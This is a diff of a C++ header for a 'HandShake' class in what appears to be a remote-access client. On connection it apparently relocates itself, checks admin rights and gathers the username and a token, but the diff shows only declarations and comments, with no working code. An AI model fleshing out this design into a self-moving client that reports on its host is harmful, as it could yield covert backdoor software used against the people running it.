@@ -8,7 +8,7 @@ using namespace  std;
 
 class HandShake
 {//Sends the primary information when the client connects.
-//Collect the first information unavailable to the program
+//Collect the first information unavailable to the program and manages the client's first actions  
 /*
 
 1- Move the program.
@@ -34,7 +34,6 @@ class HandShake
         bool getIsAdmin();//getter of is_admin
         string getPathProg();// getter see location of prog.
         string getNameUser();
-        string getToken();
         //---------------------------------------------------------------------
         void moveProg(); //First step after connection.
 
@@ -46,7 +45,7 @@ class HandShake
         // string a_key; // key for cipher.
         string a_name_user; //https://stackoverflow.com/questions/11587426/get-current-username-in-c-on-windows
         string a_current_directory; //Location of programme execute.
-        string a_location_prog; //Location of the program once moved and deleted
+        string a_location_prog; //Location of the program once moved or not moved
         string a_token;
 
         timeval a_timeout;
